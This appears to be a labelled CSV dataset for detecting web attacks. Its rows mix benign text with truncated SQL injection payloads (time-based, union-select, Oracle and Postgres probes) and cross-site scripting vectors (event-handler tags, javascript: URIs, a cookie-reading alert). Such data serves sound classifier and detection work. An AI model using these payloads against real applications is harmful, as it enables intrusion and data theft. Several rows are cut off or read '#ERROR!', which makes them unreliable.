Payload,Label,text_label,ID
1' in boolean mode ) or 7427 = dbms_pipe.receive_m,2,SQLi,14715
"javascript://'//"" --></textarea></style></script><",1,XSS,9545
1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr,2,SQLi,14306
values,0,normal,23126
"<STYLE type=""text/css"">BODY{background:url(""<javas",1,XSS,3888
I'll select the wine.,0,normal,24266
"1%"" ) ) ) or ( select 2* ( if ( ( select * from ( ",2,SQLi,19445
"1"" ) ) and 6414 = ( select count ( * ) from rdb$fi",2,SQLi,20851
"<area onmouseout=""alert(1)"">test</area>",1,XSS,4422
1' ) ) as gfzb where 7904 = 7904,2,SQLi,14553
lead,0,normal,23231
"<data oncopy=""alert(1)"" contenteditable>test</data",1,XSS,6708
select ( case when ( 9562 = 5996 ) then 1 else 956,2,SQLi,12899
"<IMG SRC=x onhashchange=""alert(String.fromCharCode",1,XSS,1176
"-6924' ) union all select 2046,2046,2046,2046,2046",2,SQLi,21181
"Select maple mahogany shaded back and sides, cellu",0,normal,25619
or SLEEP(5)--,2,SQLi,10381
or pg_sleep(__TIME__)--,2,SQLi,10095
-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = ,2,SQLi,20602
"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d45",2,SQLi,18678
"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'ud",2,SQLi,17686
Select trail.,0,normal,24660
Select the best wedding favor.,0,normal,24411
1 ) or 2633 = dbms_pipe.receive_message ( chr ( 11,2,SQLi,12834
"<optgroup onmousemove=""alert(1)"">test</optgroup>",1,XSS,8471
<script onreadystatechange=alert(1)></script>,1,XSS,3210
"-1863' ) or make_set ( 9354 = 9354,7185 ) and ( 'w",2,SQLi,17101
1' ) ) and 6690 = 3250#,2,SQLi,15405
"{""id"":null,""firstName"":""Damien"",""lastName"":""Gareth",0,normal,27332
"<meter onmouseleave=""alert(1)"">test</meter>",1,XSS,6758
<summary onpointerout=alert(1)>XSS</summary>,1,XSS,7054
1 ) ) as gocb where 4335 = 4335,2,SQLi,21062
<script for=document event=onreadystatechange>getE,1,XSS,9251
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1,XSS,1917
OR 1=0--,2,SQLi,10206
"-1956"" ) where 1448 = 1448 or 3440 = cast ( ( chr ",2,SQLi,18017
"{""id"":null,""name"":""stove flag""}",0,normal,27327
select,0,normal,26584
select,0,normal,26603
<style>:target {color:red;}</style><tr id=x style=,1,XSS,4257
"<summary onmouseout=""alert(1)"">test</summary>",1,XSS,4832
RANDOMBLOB(500000000/2),2,SQLi,10411
<pre id=x tabindex=1 onbeforeactivate=alert(1)></p,1,XSS,8889
select * from users where id = '1' or \<\ union se,2,SQLi,11412
1' and 8514 = ( select count ( * ) from domain.dom,2,SQLi,16894
"<meter ondblclick=""alert(1)"">test</meter>",1,XSS,6233
1%' ) ) ) or 2633 = dbms_pipe.receive_message ( ch,2,SQLi,14843
-6755 ) or 9323 = 9323#,2,SQLi,14455
select ( case when ( 3365 = 6236 ) then 3365 else ,2,SQLi,12961
"select * from users where id = 1 or ""%,"" or 1 = 1 ",2,SQLi,11820
"ORDER BY 1,SLEEP(5),3#",2,SQLi,10448
1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||,2,SQLi,16717
"<colgroup onpaste=""alert(1)"" contenteditable>test<",1,XSS,5050
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1,XSS,286
"1"" ) ) ) and sleep ( 5 ) #",2,SQLi,19980
"-1653 union all select 8415,8415,8415,8415,8415,84",2,SQLi,18966
select ( case when ( 5796 = 8326 ) then 5796 else ,2,SQLi,14875
"<>""'%; ) ( &+",2,SQLi,12045
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10472
<x onmouseover=alert(1)>hover this!,1,XSS,9354
"-9037%"" union all select 6583#",2,SQLi,16689
<q onpointerenter=alert(1)>XSS</q>,1,XSS,6240
"><script>alert(String.fromCharCode(88,83,83))</scr",1,XSS,9688
"?clickTAG=javascript:alert(1)"",",1,XSS,9864
1' or 7417 = ( select count ( * ) from sysibm.syst,2,SQLi,19096
"-8432 ) union all select 8169,8169,8169,8169,8169,",2,SQLi,14477
select * from users where id = 1 <@.. or 1 = 1 -- ,2,SQLi,11991
<style>:target {transform: rotate(180deg);}</style,1,XSS,8492
"{""id"":null,""name"":""PrinceMamemon""}",0,normal,27128
1 ) or 7417 = ( select count ( * ) from sysibm.sys,2,SQLi,14096
"-7084%' union all select 5727,5727,5727,5727,5727,",2,SQLi,21581
<nextid onpointermove=alert(1)>XSS</nextid>,1,XSS,2048
"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( """,2,SQLi,14675
"1"" union all select null,null,null,null,null,null,",2,SQLi,14729
"-9096"" ) where 9452 = 9452 or 4144 = ( select uppe",2,SQLi,20256
"1%"" ) union all select null,null,null,null,null,nu",2,SQLi,17148
"1 ) ) ) union all select null,null--",2,SQLi,21462
Select your company.,0,normal,24861
<%tag style=âxss:expression(alert(âXSSâ))â>,1,XSS,9752
<content id=x tabindex=1 onactivate=alert(1)></con,1,XSS,4743
1' ) as sagj where 4558 = 4558,2,SQLi,16788
"<shadow ondblclick=""alert(1)"">test</shadow>",1,XSS,3066
"<font onmouseup=""alert(1)"">test</font>",1,XSS,5410
1'+ ( select mrdi where 7451 = 7451 and 8594 = ( s,2,SQLi,17004
[ ](http://a?p=[[/onclick=alert(0) .]]),1,XSS,9444
"{""id"":null,""name"":""Tangrowth""}",0,normal,27381
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10613
Retrieve rows where applicable.,0,normal,23296
Where's your SQL know-how?,0,normal,23392
"><script>alert(XSS by \nxss"")</script>><marquee><h",1,XSS,1345
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" C",1,XSS,1041
"1' ) union all select null,null,null,null,null,nul",2,SQLi,21716
1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,2,SQLi,19128
"select * from generate_series ( 7494,7494,case whe",2,SQLi,16505
1' ) ) and ( select * from ( select ( sleep ( 5 ) ,2,SQLi,18957
1 ) ) and ( select * from ( select ( sleep ( 5 ) ),2,SQLi,19114
Apple's CarPlay is coming to select vehicles from ,0,normal,26358
SELECT SLEEP(5); #,2,SQLi,11355
1' ) where 8204 = 8204,2,SQLi,15304
"<style>@keyframes slidein {}</style><frame style=""",1,XSS,6141
1' ) where 2121 = 2121 or 4915 = ( select count ( ,2,SQLi,15318
<iframe onpointerenter=alert(1)>XSS</iframe>,1,XSS,8830
select * from users where id = '1' or $<\. union s,2,SQLi,11871
"select * from users where id = 1 or 1#"" ( union se",2,SQLi,11376
Just select the Amazon Music Unlimited option befo,0,normal,25928
"1"" ) and 6414 = ( select count ( * ) from rdb$fiel",2,SQLi,21798
<applet onpointerleave=alert(1)>XSS</applet>,1,XSS,8217
"{""id"":null,""firstName"":""Ashikin"",""lastName"":""Said""",0,normal,27318
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/x",1,XSS,1089
1' ) ) ) and 8407 = ( select count ( * ) from gene,2,SQLi,21574
"make_set ( 5679 = 9769,9769 )",2,SQLi,21752
1<set/xmlns=`urn:schemas-microsoft-com:time` style,1,XSS,719
"<map onmousemove=""alert(1)"">test</map>",1,XSS,3408
"<isindex onmouseover=""alert(1)"">test</isindex>",1,XSS,5449
"-1485' ) ) ) union all select 7661,7661,7661,7661,",2,SQLi,13579
-3361'|| ( select 'msfi' where 4806 = 4806 union a,2,SQLi,18414
"<td oncontextmenu=""alert(1)"">test</td>",1,XSS,5807
"<textarea draggable=""true"" ondrag=""alert(1)"">test<",1,XSS,5903
"<div onmouseout=""alert(1)"">test</div>",1,XSS,2937
"<table draggable=""true"" ondragleave=""alert(1)"">tes",1,XSS,2514
<colgroup id=x tabindex=1 onactivate=alert(1)></co,1,XSS,4933
Create a captivating poem about love.,0,normal,22969
<rp onfocusout=alert(1) tabindex=1 id=x></rp><inpu,1,XSS,5860
"<style onbeforecut=""alert(1)"" contenteditable>test",1,XSS,8190
"1%"" ) ) and 8316 = 6410#",2,SQLi,16188
"1"" ) ) union all select null,null,null,null,null,n",2,SQLi,20535
"<title onkeydown=""alert(1)"" contenteditable>test</",1,XSS,3254
"<main draggable=""true"" ondragend=""alert(1)"">test</",1,XSS,4935
"-7122"" ) union all select 4002,4002,4002,4002,4002",2,SQLi,13726
"1"" ) ) as bosq where 4695 = 4695",2,SQLi,16559
"1"" ) where 2657 = 2657 and 5309 = 7592--",2,SQLi,14462
1' ) as ildf where 5545 = 5545 union all select nu,2,SQLi,17903
1,0,normal,26735
Where's the drugstore?,0,normal,23622
declare @q nvarchar ( 4000 ) select @q =,2,SQLi,11922
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,12530
1 where 8889 = 8889,2,SQLi,15983
"<menuitem onmousemove=""alert(1)"">test</menuitem>",1,XSS,3080
"select * from users where id = 1 or ""1_"" or 1 = 1 ",2,SQLi,11491
"<rp draggable=""true"" ondragenter=""alert(1)"">test</",1,XSS,3259
"1"" ) or 1022 = ( select count ( * ) from all_users",2,SQLi,14739
eval(location.hash.slice(1)>#alert(1),1,XSS,9376
"{""id"":null,""name"":""slide""}",0,normal,27096
"<rtc draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,5280
"<link rel=import href=""data:text/html&comma;&lt;sc",1,XSS,9225
"1%' union all select null,null,null,null,null,null",2,SQLi,13645
where,0,normal,26524
"-3852' ) union all select 3577,3577,3577,3577,3577",2,SQLi,14765
"<style>@keyframes slidein {}</style><wbr style=""an",1,XSS,3121
<isindex id=x tabindex=1 onactivate=alert(1)></isi,1,XSS,5936
1'|| ( select 'ypqa' where 1961 = 1961 or 6793 = (,2,SQLi,21514
<font onblur=alert(1) tabindex=1 id=x></font><inpu,1,XSS,2816
"<script>throw onerror=eval,'alert\x281\x29'</scrip",1,XSS,124
<svg><animate onrepeat=alert(1) attributeName=x du,1,XSS,31
Restricted governance committee meets to select he,0,normal,25749
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><,1,XSS,6534
<style>:target {transform: rotate(180deg);}</style,1,XSS,5951
"<link oncopy=""alert(1)"" contenteditable>test</link",1,XSS,4633
"1%"" ) ) ) or sleep ( 5 ) and ( ( ( ""%"" = """,2,SQLi,15102
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2010
"<iframe draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,7873
"select * from generate_series ( 6730,6730,case whe",2,SQLi,20774
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,1,XSS,1111
"-5857%"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( ",2,SQLi,20171
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8375
"1"" ) or 4411 = ( select count ( * ) from sysusers ",2,SQLi,22400
"{""id"":null,""name"":""matter from""}",0,normal,26948
><script+src=https://m.addthis.com/live/red_lojson,1,XSS,9807
1' in boolean mode ) or 5356 = ( select count ( * ,2,SQLi,18677
OR x=x,2,SQLi,10201
<image src=validimage.png onloadstart=alert(1)>,1,XSS,4325
"<optgroup onbeforecopy=""alert(1)"" contenteditable>",1,XSS,6520
-3953 ) as wjjk where 6433 = 6433 or make_set ( 93,2,SQLi,19526
"<option oncontextmenu=""alert(1)"">test</option>",1,XSS,8124
AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 13,2,SQLi,11190
Select a fitness class to join.,0,normal,24145
"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and (",2,SQLi,15130
#ERROR!,2,SQLi,11262
-8615 ) ) ) or 4039 = 9144,2,SQLi,20954
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><in,1,XSS,7137
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20",2,SQLi,10880
"<bdi onmouseout=""alert(1)"">test</bdi>",1,XSS,5248
"-3865"" ) where 3559 = 3559 union all select 3559,3",2,SQLi,18012
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,14744
1,0,normal,26663
Update the software package.,0,normal,22725
ORDER BY 17--,2,SQLi,10259
ORDER BY 28,2,SQLi,10332
"<applet draggable=""true"" ondragend=""alert(1)"">test",1,XSS,2950
OR x=x#,2,SQLi,10204
<script\x2F>javascript:alert(1)</script>,1,XSS,602
<svg><summary onload=alert(1)></summary>,1,XSS,4418
<multicol id=x tabindex=1 onbeforeactivate=alert(1,1,XSS,3837
"{""id"":null,""name"":""Magpie""}",0,normal,27024
"<style>@keyframes x{}</style><details style=""anima",1,XSS,6564
1'+ ( select 'wkbg' where 3921 = 3921 and 8407 = (,2,SQLi,21599
Select the best ingredients.,0,normal,24301
<svg><bgsound onload=alert(1)></bgsound>,1,XSS,2566
1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) |,2,SQLi,20375
"-1372%' ) ) ) union all select 8403,8403,8403,8403",2,SQLi,15216
&lt;,1,XSS,1063
"-7324 ) or make_set ( 8486 = 6544,6544 )",2,SQLi,19612
ORDER BY 30,2,SQLi,10334
"<strong onclick=""alert(1)"">test</strong>",1,XSS,6842
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",1,XSS,5553
"To do this, tap and hold the highlight, select ""Ed",0,normal,25272
>/KinG-InFeT.NeT/><script>alert(document.cookie)</,1,XSS,1340
"{""id"":null,""firstName"":""June"",""lastName"":""Lam"",""ad",0,normal,27610
select * from users where id = 1 + $+%1 or 1 = 1 -,2,SQLi,11779
<script id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,3574
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10589
) or pg_sleep(__TIME__)--,2,SQLi,10127
"{""id"":null,""name"":""goose""}",0,normal,27123
-6581'|| ( select 'hpjd' where 7608 = 7608 union a,2,SQLi,19093
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",2,SQLi,10721
"1', ( select ( case when ( 7734 = 7734 ) then ( se",2,SQLi,19694
"-9057"" ) or 1 group by concat ( 0x7171706a71, ( se",2,SQLi,13315
"<dir draggable=""true"" ondrag=""alert(1)"">test</dir>",1,XSS,6513
1' ) ) waitfor delay '0:0:5' and ( ( 'jcfe' = 'jcf,2,SQLi,20589
"<style>@keyframes slidein {}</style><code style=""a",1,XSS,3063
"1 or row ( 1045,7562 ) > ( select count ( * ) ,con",2,SQLi,19638
"-9856"" union all select 9753--",2,SQLi,21484
></iframe><script>alert(123)</script>,1,XSS,1325
"<a href=javas\x00cript:javascript:alert(1)"" id=""fu",1,XSS,429
"<strike ondblclick=""alert(1)"">test</strike>",1,XSS,7188
"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 w",2,SQLi,19659
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2899
A Schumer spokesperson says in an email that he ha,0,normal,26431
"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 )",2,SQLi,12577
<menuitem onblur=alert(1) tabindex=1 id=x></menuit,1,XSS,5296
"<![><img src=""]><img src=x onerror=javascript:aler",1,XSS,632
<style>@keyframes slidein {}</style><multicol styl,1,XSS,3504
"{""id"":null,""firstName"":""Ryan Low Low"",""lastName"":""",0,normal,26853
"1%"" ) and 8024 = 3560--",2,SQLi,12093
1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) ,2,SQLi,12736
select sleep ( 5 ) and ( 4863 = 4863,2,SQLi,18951
"<mark onmouseenter=""alert(1)"">test</mark>",1,XSS,2535
#ERROR!,2,SQLi,22540
or 'text' > 't',2,SQLi,10143
1 and 4595 = 4595#,2,SQLi,18537
1 where 9774 = 9774,2,SQLi,15217
"<style>@keyframes x{}</style><figure style=""animat",1,XSS,2590
"<iframe onbeforeload iframe onbeforeload=""javascri",1,XSS,412
"1%"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x71",2,SQLi,22181
1' where 4134 = 4134 and 1102 = 6300--,2,SQLi,18575
Delete the outdated photos.,0,normal,22756
"<style onkeydown=""alert(1)"" contenteditable>test</",1,XSS,2091
1' ) ) as dago where 9788 = 9788,2,SQLi,17108
Carefully select the items.,0,normal,24475
<plaintext onblur=alert(1) tabindex=1 id=x></plain,1,XSS,7097
Select a seat.,0,normal,24808
1 ) as keog where 8033 = 8033 and extractvalue ( 7,2,SQLi,19042
<s onfocusout=alert(1) tabindex=1 id=x></s><input ,1,XSS,3098
"<optgroup onkeyup=""alert(1)"" contenteditable>test<",1,XSS,5230
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",1,XSS,3956
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11928
It enables children to select a specific color tha,0,normal,25972
"-8754"" ) ) ) union all select 7391,7391,7391,7391,",2,SQLi,18721
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&qu,1,XSS,1455
"<tfoot draggable=""true"" ondragenter=""alert(1)"">tes",1,XSS,6078
<iframe onpointerout=alert(1)>XSS</iframe>,1,XSS,2732
1' and 6537 = dbms_pipe.receive_message ( chr ( 76,2,SQLi,19332
outer,0,normal,23116
You can select to view the film with optional Engl,0,normal,25075
1 ) ) as oqfr where 6426 = 6426 and make_set ( 840,2,SQLi,14444
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 whe,2,SQLi,13027
"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>",1,XSS,200
Select a quote to share on social media.,0,normal,24196
from,0,normal,23104
1 ) and 6414 = ( select count ( * ) from rdb$field,2,SQLi,21648
"1' in boolean mode ) or updatexml ( 1808,concat ( ",2,SQLi,13805
<small id=x tabindex=1 onactivate=alert(1)></small,1,XSS,2043
"1%"" ) and ( select 9067 from ( select count ( * ) ",2,SQLi,13469
1' ) and 6510 = ( select count ( * ) from sysusers,2,SQLi,13300
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10693
1' ) and 8407 = ( select count ( * ) from generate,2,SQLi,22286
-9562' or 8571 = 8571--,2,SQLi,20104
"1' ) ) union all select null,null,null#",2,SQLi,22146
"<nobr onmousedown=""alert(1)"">test</nobr>",1,XSS,4452
"<form id=""test"" /><button form=""test"" formaction=""",1,XSS,1115
"<rp onclick=""alert(1)"">test</rp>",1,XSS,2832
"<map onkeydown=""alert(1)"" contenteditable>test</ma",1,XSS,6466
Select the right path for your path.,0,normal,24225
Filter the posts,0,normal,22889
"<IMG SRC='vbscript:msgbox("""")'>",1,XSS,8657
<caption onpointerleave=alert(1)>XSS</caption>,1,XSS,3512
"<colgroup draggable=""true"" ondragleave=""alert(1)"">",1,XSS,8024
"<ruby draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,8942
Select adapt.,0,normal,24776
"<select onclick=""alert(1)"">test</select>",1,XSS,3713
"<video><track default onload=alert(1) src=""data:te",1,XSS,8051
ORDER BY 10,2,SQLi,10314
al\u0065rt`1`,1,XSS,9394
"<meter oncontextmenu=""alert(1)"">test</meter>",1,XSS,7716
"-1975"" union all select 8638,8638,8638,8638,8638,8",2,SQLi,16337
"I, meanwhile, have been able to select and shed ha",0,normal,26064
"<li onmouseenter=""alert(1)"">test</li>",1,XSS,3441
"-3452%' or 1570 = convert ( int, ( select char ( 1",2,SQLi,16433
"-9565"" where 1616 = 1616 union all select 1616,161",2,SQLi,21083
"<? foo=""><x foo='?><script>javascript:alert(1)</sc",1,XSS,648
"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""h",2,SQLi,22032
1 ) as fxfe where 1148 = 1148 or ( select * from (,2,SQLi,19060
"<dialog draggable=""true"" ondrag=""alert(1)"">test</d",1,XSS,5829
"AND ELT(1337=1337,SLEEP(5)) AND 1337"" LIKE ""1337",2,SQLi,11278
"<colgroup onclick=""alert(1)"">test</colgroup>",1,XSS,7572
"<img src=""javascript:alert(1)"">",1,XSS,232
"1%"" union all select null,null,null,null,null,null",2,SQLi,15545
"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qq",2,SQLi,19651
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113",2,SQLi,16597
<style>:target {color: red;}</style><tt id=x style,1,XSS,7843
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""f",1,XSS,502
select pg_sleep ( 5 ) -- ojzt,2,SQLi,12896
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:",1,XSS,741
Save up to 30% off select Anker Soundcore Premium ,0,normal,25723
`'><script>\xE2\x81\x9Fjavascript:alert(1)</script,1,XSS,578
"?callback=javascript:alert(1)"",",1,XSS,9874
"<caption draggable=""true"" ondragstart=""alert(1)"">t",1,XSS,5700
1' ) as asjj where 1721 = 1721 union all select nu,2,SQLi,17617
-1386' ) or ( 7880 = 5362 ) *5362 and ( 'vsyu' lik,2,SQLi,16424
...,1,XSS,314
check,0,normal,23179
"1%"" ) or 7417 = ( select count ( * ) from sysibm.s",2,SQLi,15844
) or pg_sleep(5)--,2,SQLi,10369
"-8007' where 9649 = 9649 union all select 9649,964",2,SQLi,22235
"1%"" ) ( select ( case when ( 4587 = 4587 ) then re",2,SQLi,19796
<cite id=x tabindex=1 ondeactivate=alert(1)></cite,1,XSS,2268
select sleep ( 5 ) #,2,SQLi,14209
"-1303' union all select 4840,4840#",2,SQLi,17995
"<dl oncontextmenu=""alert(1)"">test</dl>",1,XSS,3937
"select count ( * ) from domain.domains as t1,domai",2,SQLi,16903
"-1891' in boolean mode ) union all select 6680,668",2,SQLi,12570
"<i draggable=""true"" ondragstart=""alert(1)"">test</i",1,XSS,2861
"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ",2,SQLi,14810
"1', ( select * from generate_series ( 5609,5609,ca",2,SQLi,18799
"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",2,SQLi,16030
Select your words.,0,normal,24809
"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,17933
Home Depot is offering up to 20% off select Nest T,0,normal,26093
Plant a fruit tree.,0,normal,22750
"{""id"":null,""firstName"":""Jack"",""lastName"":""Tan"",""ad",0,normal,27182
"{""id"":null,""firstName"":""Lih Fua"",""lastName"":""Lua"",",0,normal,27573
"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,",1,XSS,1233
1 ) as mpnj where 5049 = 5049,2,SQLi,22217
"<picture onmousemove=""alert(1)"">test</picture>",1,XSS,5517
pg_sleep ( __TIME__ ) --,2,SQLi,11677
or 'something' = 'some'+'thing',2,SQLi,10155
"1', ( select 2* ( if ( ( select * from ( select co",2,SQLi,15162
"{""id"":null,""name"":""concerned remember courage""}",0,normal,27615
"As a speaker, he was clear, logical and impressive",0,normal,26354
1' ) as bscn where 6907 = 6907,2,SQLi,14176
-7950' ) or 9323 = 9323#,2,SQLi,20323
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/",2,SQLi,10875
( select * from ( select ( sleep ( 5 ) ) ) lrov ),2,SQLi,20579
"Because when they came in to select ideas, they we",0,normal,26330
"1' ) ) procedure analyse ( extractvalue ( 9255,con",2,SQLi,21029
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2176
Select commerce.,0,normal,24769
Select a place to hang out with friends.,0,normal,24102
Insert photo.,0,normal,23060
or 'one'='oneâ,2,SQLi,10014
"-1170' union all select 4663,4663,4663,4663,4663,4",2,SQLi,17179
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,3298
1 ) as kaew where 2658 = 2658,2,SQLi,13516
-5143'+ ( select 'zyrr' where 8405 = 8405 union al,2,SQLi,21509
"<style>@keyframes x{}</style><option style=""animat",1,XSS,8028
1' ) where 6622 = 6622 order by 1--,2,SQLi,12250
"<strike onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,1928
"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ",2,SQLi,13435
Select the perfect quote for your post.,0,normal,24120
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10421
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound,1,XSS,4413
"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode",1,XSS,1237
<style>:target {color:red;}</style><del id=x style,1,XSS,3595
Select the best method.,0,normal,24299
"<listing draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,4039
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(",1,XSS,737
"-9861' union all select 5710,5710,5710,5710,5710--",2,SQLi,18503
"<script> setTimeout(\\""writetitle()\\"",$\_GET\[\])",1,XSS,3619
"-6463"" ) ) ) union all select 3280,3280,3280,3280,",2,SQLi,16560
1'|| ( select 'pyga' from dual where 8501 = 8501 o,2,SQLi,17632
1' ) and 8514 = ( select count ( * ) from domain.d,2,SQLi,12835
"1%"" ) ) or 5356 = ( select count ( * ) from sysuse",2,SQLi,13815
<wbr onpointerenter=alert(1)>XSS</wbr>,1,XSS,2640
"<figure oncopy=""alert(1)"" contenteditable>test</fi",1,XSS,7254
-6015%' ) order by 1--,2,SQLi,17069
<hr onblur=alert(1) tabindex=1 id=x></hr><input au,1,XSS,8173
select pg_sleep ( 5 ) # pjvi,2,SQLi,13380
"<menuitem onmouseout=""alert(1)"">test</menuitem>",1,XSS,3581
"<link draggable=""true"" ondrag=""alert(1)"">test</lin",1,XSS,3816
"<textarea onmousedown=""alert(1)"">test</textarea>",1,XSS,5745
"<track onkeypress=""alert(1)"" contenteditable>test<",1,XSS,7134
"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ",2,SQLi,16331
"1"" where 8727 = 8727",2,SQLi,12487
"<kbd onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,3353
1' ) where 2725 = 2725 and 9254 = ( select count (,2,SQLi,19593
1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 58,2,SQLi,16725
<style>:target {color: red;}</style><dt id=x style,1,XSS,2683
"<template onclick=""alert(1)"">test</template>",1,XSS,5507
Select the right tool.,0,normal,22570
<script\x09>javascript:alert(1)</script>,1,XSS,608
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 1,2,SQLi,13667
<object onafterscriptexecute=confirm(0)>,1,XSS,9710
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--",2,SQLi,10775
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk={call",1,XSS,9485
<head onpointerup=alert(1)>XSS</head>,1,XSS,3272
"1 ) as oblq where 2002 = 2002 or updatexml ( 1808,",2,SQLi,13270
"1%"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( ",2,SQLi,15530
"-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ",2,SQLi,16027
"<object data=""javascript:alert(XSS)"">",1,XSS,323
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IP",1,XSS,1316
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1,XSS,6924
"{""id"":null,""name"":""Lickilicky""}",0,normal,26909
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascrip",1,XSS,455
select ( case when ( 5856 = 7176 ) then 5856 else ,2,SQLi,20748
"-2434 ) union all select 8310,8310,8310,8310,8310-",2,SQLi,15962
<ul id=x tabindex=1 onactivate=alert(1)></ul>,1,XSS,4002
", if not ( ( select serverproperty ( 'isintegrated",2,SQLi,11764
"-5891 union all select 7103,7103,7103,7103--",2,SQLi,12701
"1"" ) as htyo where 8322 = 8322 and 4595 = 4595#",2,SQLi,20223
delete,0,normal,23108
Filter the search results for relevant information,0,normal,22948
"<html onmouseleave=""alert(1)"">test</html>",1,XSS,6441
"<body onmouseout=""alert(1)"">test</body>",1,XSS,7904
